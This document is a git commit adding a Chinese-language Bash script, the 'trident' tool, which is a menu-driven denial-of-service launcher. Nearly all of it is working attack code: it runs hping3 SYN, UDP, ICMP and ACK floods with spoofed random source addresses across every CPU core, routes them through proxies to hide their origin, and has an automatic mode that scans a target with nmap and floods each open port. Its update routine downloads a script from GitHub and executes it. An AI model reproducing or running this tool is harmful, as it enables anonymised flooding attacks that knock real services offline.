16a578145279f894a03248cc958921d6e93d79a0
1477092968 <1477092968@qq.com>
2025-09-16 16:05:04 +0800

    Add files via upload

---
+++ ruuu.sh
@@ -0,0 +1,552 @@
+#!/bin/bash
+
+# Repository: https://github.com/sshpc/trident
+export LANG=en_US.UTF-8
+
+# 全局变量
+declare -r VERSION='0.5.1'
+declare -r CONFIG_FILE="$HOME/trident_tmp/config.conf"
+declare -r LOG_FILE="$HOME/trident_tmp/run.log"
+declare -r TMP_DIR="$HOME/trident_tmp"
+
+# 颜色定义
+RED='\033[0;31;31m'
+GREEN='\033[0;31;32m'
+YELLOW='\033[0;31;33m'
+BLUE='\033[0;31;36m'
+NC='\033[0m' # 无颜色
+
+# 获取 CPU 核心数
+CONCURRENT_ATTACKS=$(nproc)
+
+# 默认配置
+declare TARGET_IP=""
+declare SOURCE_IP=""
+declare PROXY_IP=""
+declare PROXY_PORT=""
+declare PROXY_TYPE="http" # 支持 http 和 socks5
+declare DURATION=10
+declare PACKET_SIZE=120
+declare TARGET_PORT=80
+declare RELEASE="linux"
+
+# 函数声明
+function error_exit() {
+    echo -e "${RED}错误: \$1${NC}" >&2
+    exit 1
+}
+
+function log_action() {
+    local timestamp
+    timestamp=$(date +"%Y-%m-%d %H:%M:%S")
+    echo "$timestamp | \$1 | \$2" >> "$LOG_FILE"
+}
+
+function _red() {
+    echo -e "${RED}\$1${NC}"
+}
+
+function _green() {
+    echo -e "${GREEN}\$1${NC}"
+}
+
+function _yellow() {
+    echo -e "${YELLOW}\$1${NC}"
+}
+
+function _blue() {
+    echo -e "${BLUE}\$1${NC}"
+}
+
+function wait_input() {
+    echo
+    read -n1 -r -p "按任意键继续...(退出按 Ctrl+C)" 
+    echo
+}
+
+function loading() {
+    local pids=("$@")
+    local delay=0.1
+    local spinstr='|/-\'
+    tput civis
+
+    while :; do
+        local all_done=true
+        for pid in "${pids[@]}"; do
+            if kill -0 "$pid" 2>/dev/null; then
+                all_done=false
+                printf "\r\033[0;36m[ %c ] 正在执行 ...\033[0m" "$spinstr"
+                spinstr=${spinstr:1}${spinstr:0:1}
+                sleep "$delay"
+            fi
+        done
+        [[ $all_done == true ]] && break
+    done
+
+    tput cnorm
+    printf "\r\033[K"
+}
+
+function check_system() {
+    if [[ -f /etc/redhat-release || $(grep -i "centos" /proc/version) ]]; then
+        RELEASE="centos"
+        INSTALL_TYPE='yum -y install'
+        REMOVE_TYPE='yum -y remove'
+        UPGRADE="yum update -y --skip-broken"
+    elif grep -qi "debian" /etc/issue || grep -qi "debian" /proc/version || grep -qi "ID=debian" /etc/os-release; then
+        RELEASE="debian"
+        INSTALL_TYPE='apt -y install'
+        UPGRADE="apt update"
+        REMOVE_TYPE='apt -y autoremove'
+    elif grep -qi "ubuntu" /etc/issue || grep -qi "ubuntu" /proc/version; then
+        RELEASE="ubuntu"
+        INSTALL_TYPE='apt -y install'
+        UPGRADE="apt update"
+        REMOVE_TYPE='apt -y autoremove'
+    elif grep -qi "Alpine" /etc/issue || grep -qi "Albian" /proc/version; then
+        RELEASE="alpine"
+        INSTALL_TYPE='apk add'
+        UPGRADE="apk update"
+        REMOVE_TYPE='apk del'
+    else
+        error_exit "不支持此系统"
+    fi
+}
+
+function check_dependencies() {
+    local deps=('hping3' 'nmap' 'curl' 'proxychains')
+    for dep in "${deps[@]}"; do
+        if ! command -v "$dep" &>/dev/null; then
+            _yellow "$dep 未安装，正在安装..."
+            if ! $UPGRADE || ! $INSTALL_TYPE "$dep"; then
+                error_exit "安装 $dep 失败，请检查网络或权限。"
+            fi
+        fi
+    done
+}
+
+function cleanup() {
+    _yellow "清理中，杀掉所有子进程..."
+    local pids
+    pids=$(jobs -p)
+    [[ -n "$pids" ]] && kill $pids
+}
+
+function menu_top() {
+    clear
+    _yellow "  |                  v: $VERSION"
+    _yellow '| | |'
+    _yellow "__|__                目标IP: $TARGET_IP"
+    _yellow '  |  '
+    _yellow '  |  '
+    _yellow "  |                  OS: $RELEASE  "
+    echo
+    _blue "当前菜单: $menuname " 
+    echo
+}
+
+function menu() {
+    menu_top
+    # 如果文件存在重新加载配置
+    if [[ -f "$CONFIG_FILE" ]]; then
+        source "$CONFIG_FILE"
+    fi
+
+    local options=("$@")
+    local num_options=${#options[@]}
+    local max_len=0
+
+    for ((i = 0; i < num_options; i += 2)); do
+        local str_len=${#options[i]}
+        ((str_len > max_len)) && max_len=$str_len
+    done
+
+    for ((i = 0; i < num_options; i += 4)); do
+        printf "%s%*s  " "$((i / 2 + 1)): ${options[i]}" "$((max_len - ${#options[i]}))"
+        [[ -n "${options[i + 2]}" ]] && printf "$((i / 2 + 2)): ${options[i + 2]}"
+        echo -e "\n"
+    done
+
+    _blue "q: 退出  b: 返回  0: 首页"
+    echo
+    read -ep "请输入命令号: " number
+
+    case "$number" in
+        [1-$((num_options / 2))])
+            local action_index=$((2 * (number - 1) + 1))
+            parentfun=${options[action_index]}
+            ${options[action_index]}
+            wait_input
+            main
+            ;;
+        0) main ;;
+        b) 
+            if [[ -n "$parentfun" ]]; then
+                $parentfun
+            else
+                main
+            fi
+            ;;
+        q) exit ;;
+        *)
+            _red '输入错误'
+            wait_input
+            main
+            ;;
+    esac
+}
+
+function configure_proxy() {
+    while true; do
+        read -ep "请输入代理类型 (http/socks5) [默认: http]: " proxy_type
+        proxy_type=${proxy_type:-http}
+        if [[ "$proxy_type" != "http" && "$proxy_type" != "socks5" ]]; then
+            _red "错误：无效的代理类型"
+            continue
+        fi
+        break
+    done
+
+    while true; do
+        read -ep "请输入代理 IP: " proxy_ip
+        if [[ -z "$proxy_ip" ]]; then
+            _red "错误：代理 IP 不能为空"
+            continue
+        fi
+        break
+    done
+
+    while true; do
+        read -ep "请输入代理端口: " proxy_port
+        if [[ -z "$proxy_port" || ! "$proxy_port" =~ ^[0-9]+$ ]]; then
+            _red "错误：无效的代理端口"
+            continue
+        fi
+        break
+    done
+
+    PROXY_IP=$proxy_ip
+    PROXY_PORT=$proxy_port
+    PROXY_TYPE=$proxy_type
+    save_config
+}
+
+function configure_target_ip() {
+    while true; do
+        read -ep "请输入目标IP: " target_ip
+        if [[ -z "$target_ip" ]]; then
+            _red "错误：IP地址不能为空"
+            continue
+        fi
+        if [[ "$target_ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ || "$target_ip" =~ ^([a-fA-F0-9]{1,4}:){7}[a-fA-F0-9]{1,4}$ ]]; then
+            TARGET_IP=$target_ip
+            break
+        else
+            _red "错误：无效的IP地址格式"
+        fi
+    done
+    save_config
+}
+
+function configure_packet_size() {
+    read -ep "请输入数据包大小(默认 120): " packet_size
+    packet_size=${packet_size:-120}
+    PACKET_SIZE=$packet_size
+    save_config
+}
+
+function configure_duration() {
+    read -ep "请输入持续时间(秒，默认 10): " duration
+    duration=${duration:-10}
+    DURATION=$duration
+    save_config
+}
+
+function configure_target_port() {
+    read -ep "请输入目标端口(默认 80): " target_port
+    target_port=${target_port:-80}
+    TARGET_PORT=$target_port
+    save_config
+}
+
+function configure_source_ip() {
+    read -ep "请输入源IP地址(为空则随机ip): " source_ip
+    SOURCE_IP=$source_ip
+    save_config
+}
+
+function save_config() {
+    {
+        echo "TARGET_IP=$TARGET_IP"
+        echo "SOURCE_IP=$SOURCE_IP"
+        echo "PROXY_IP=$PROXY_IP"
+        echo "PROXY_PORT=$PROXY_PORT"
+        echo "PROXY_TYPE=$PROXY_TYPE"
+        echo "DURATION=$DURATION"
+        echo "PACKET_SIZE=$PACKET_SIZE"
+        echo "TARGET_PORT=$TARGET_PORT"
+    } > "$CONFIG_FILE"
+    _green "配置已保存到 $CONFIG_FILE"
+}
+
+function execute_attack() {
+    local attack_type=\$1
+    local attack_flag=\$2
+    local target_ip=\$3
+    local target_port=\$4
+    local packet_size=\$5
+    local duration=\$6
+
+    local sourcepattern
+    if [[ -n "$SOURCE_IP" ]]; then
+        sourcepattern="-a $SOURCE_IP"
+    else
+        sourcepattern="--rand-source"
+    fi
+
+    local proxy_command
+    if [[ -n "$PROXY_IP" ]]; then
+        if [[ "$PROXY_TYPE" == "http" ]]; then
+            proxy_command="proxychains"
+        elif [[ "$PROXY_TYPE" == "socks5" ]]; then
+            proxy_command="proxychains -q"
+        else
+            error_exit "无效的代理类型"
+        fi
+    fi
+
+    log_action "Attack Start" "$proxy_command hping3 -c $((duration * 1000)) -d $packet_size $attack_flag -p $target_port --flood $sourcepattern $target_ip"
+
+    if [[ "$attack_type" == "ICMP" ]]; then
+        _yellow "攻击类型: $attack_type"
+        _yellow "目标: $target_ip"
+        _yellow "命令: $proxy_command hping3 -c $((duration * 1000)) -d $packet_size $attack_flag --flood $sourcepattern $target_ip"
+        $proxy_command hping3 -c $((duration * 1000)) -d "$packet_size" $attack_flag --flood $sourcepattern "$target_ip" &
+    else
+        _yellow "攻击类型: $attack_type"
+        _yellow "目标: $target_ip:$target_port"
+        _yellow "命令: $proxy_command hping3 -c $((duration * 1000)) -d $packet_size $attack_flag -p $target_port --flood $sourcepattern $target_ip"
+        $proxy_command hping3 -c $((duration * 1000)) -d "$packet_size" $attack_flag -p "$target_port" --flood $sourcepattern "$target_ip" &
+    fi
+}
+
+function validate_params() {
+    local params=("$@")
+    local need_prompt=false
+
+    for param in "${params[@]}"; do
+        case "$param" in
+            "IP")
+                if [[ -z "$TARGET_IP" ]]; then
+                    _yellow "目标IP未配置"
+                    configure_target_ip
+                    need_prompt=true
+                fi
+                ;;
+            "PORT")
+                if [[ -z "$TARGET_PORT" ]]; then
+                    _yellow "目标端口未配置"
+                    configure_target_port
+                    need_prompt=true
+                fi
+                ;;
+            "SIZE")
+                if [[ -z "$PACKET_SIZE" ]]; then
+                    _yellow "数据包大小未配置"
+                    configure_packet_size
+                    need_prompt=true
+                fi
+                ;;
+            "TIME")
+                if [[ -z "$DURATION" ]]; then
+                    _yellow "持续时间未配置"
+                    configure_duration
+                    need_prompt=true
+                fi
+                ;;
+        esac
+    done
+
+    if [[ $need_prompt == true ]]; then
+        save_config
+        source "$CONFIG_FILE"
+    fi
+}
+
+function hping3_attack() {
+    menuname="首页/HPING3攻击"
+
+    attack_menu() {
+        local attack_type=\$1
+        local attack_flag=\$2
+
+        if [[ "$attack_type" == "ICMP" ]]; then
+            validate_params "IP" "SIZE" "TIME"
+        else
+            validate_params "IP" "PORT" "SIZE" "TIME"
+        fi
+
+        jumpfun "开始执行攻击..."
+        local pids=()
+        for ((i = 0; i < CONCURRENT_ATTACKS; i++)); do
+            execute_attack "$attack_type" "$attack_flag" "$TARGET_IP" "$TARGET_PORT" "$PACKET_SIZE" "$DURATION"
+            pids+=($!) # 收集子进程 PID
+        done
+        loading "${pids[@]}" # 显示加载动画
+        wait # 等待所有子进程完成
+        jumpfun "攻击完成"
+    }
+
+    options=( 
+        "SYN Flood" "attack_menu SYN -S"
+        "UDP Flood" "attack_menu UDP --udp"
+        "ICMP Flood" "attack_menu ICMP --icmp"
+        "ACK Flood" "attack_menu ACK -A"
+    )
+    menu "${options[@]}"
+}
+
+function auto_attack() {
+    menuname="首页/全自动攻击"
+    validate_params "IP"
+
+    _yellow "开始扫描目标的常用端口..."
+    local open_ports
+    open_ports=$(nmap -p 1-1024,3306,3389,8080,8888,8443 --min-rate=1000 -T4 "$TARGET_IP" | grep 'open' | awk -F '/' '{print \$1}')
+    _yellow "开放端口: $open_ports"
+
+    local attack_types=()
+    if [[ -n "$open_ports" ]]; then
+        for port in $open_ports; do
+            attack_types+=("SYN" "-S" "$port")
+            attack_types+=("ACK" "-A" "$port")
+            attack_types+=("UDP" "--udp" "$port")
+        done
+    else
+        attack_types+=("ICMP" "--icmp" "")
+    fi
+
+    jumpfun "开始自动攻击..."
+    local pids=()
+    for ((i = 0; i < ${#attack_types[@]}; i += 3)); do
+        local attack_type=${attack_types[i]}
+        local attack_flag=${attack_types[i + 1]}
+        local target_port=${attack_types[i + 2]}
+
+        # 动态调整攻击参数
+        case "$attack_type" in
+            "UDP")
+                PACKET_SIZE=512 # 对于 UDP 攻击，增加数据包大小
+                ;;
+            "ICMP")
+                DURATION=5 # 对于 ICMP 攻击，缩短持续时间
+                ;;
+            "SYN" | "ACK")
+                PACKET_SIZE=120 # 对于 SYN/ACK 攻击，使用默认数据包大小
+                ;;
+        esac
+
+        _yellow "执行 $attack_type 攻击..."
+        execute_attack "$attack_type" "$attack_flag" "$TARGET_IP" "$target_port" "$PACKET_SIZE" "$DURATION"
+        pids+=($!) # 收集子进程 PID
+
+        # 计算若超过cpu核数退出循环
+        if [[ ${#pids[@]} -gt $CONCURRENT_ATTACKS ]]; then
+            break
+        fi
+    done
+
+    loading "${pids[@]}" 
+    wait # 等待所有子进程完成
+    _green "自动攻击完成"
+}
+
+function nmap_scan() {
+    menuname="首页/NMAP扫描"
+
+    validate_params "IP"
+
+    execute_scan() {
+        local scan_type=\$1
+        local scan_flag=\$2
+
+        _yellow "执行 $scan_type 扫描: $TARGET_IP"
+
+        nmap $scan_flag "$TARGET_IP" &
+        local pid=$!
+        loading $pid
+        wait $pid
+        jumpfun "扫描完成"
+    }
+
+    options=( 
+        "快速扫描" "execute_scan Quick -F"
+        "全面扫描" "execute_scan Comprehensive -A"
+        "端口扫描" "execute_scan Ports -p-"
+    )
+    menu "${options[@]}"
+}
+
+function update_script() {
+    _yellow "正在更新脚本..."
+    wget -N https://raw.githubusercontent.com/sshpc/trident/main/run.sh
+    if [[ $? -eq 0 ]]; then
+        jumpfun '卸载旧版临时文件'
+        rm -rf "$TMP_DIR"
+        jumpfun '更新成功'
+        chmod +x ./run.sh && ./run.sh
+    else
+        _red "下载失败,请重试"
+    fi
+}
+
+function cat_log() {
+    _yellow "查看日志 (最后20行):"
+    tail -20 "$LOG_FILE"
+}
+
+function advanced_settings() {
+    menuname="首页/高级设置"
+    options=( 
+        "配置-目标 IP" configure_target_ip
+        "配置-数据包大小" configure_packet_size
+        "配置-持续时间" configure_duration
+        "配置-目标端口" configure_target_port
+        "配置-来源 IP" configure_source_ip
+        "配置-代理" configure_proxy
+    )
+    menu "${options[@]}"
+}
+
+function main() {
+    # 加载配置文件
+    if [[ -f "$CONFIG_FILE" ]]; then
+        source "$CONFIG_FILE"
+    fi
+
+    menuname='首页'
+    options=( 
+        "全自动攻击" auto_attack
+        "手动攻击" hping3_attack
+        "端口扫描" nmap_scan
+        "升级脚本" update_script
+        "高级设置" advanced_settings
+        "查看日志" cat_log
+    )
+    menu "${options[@]}"
+}
+
+# 检查系统
+check_system
+# 检查依赖
+check_dependencies
+
+# 检查并创建目录
+if [[ ! -d "$TMP_DIR" ]]; then
+    mkdir -p "$TMP_DIR"
+fi
+
+# 脚本退出时清理
+trap cleanup EXIT
+
+main
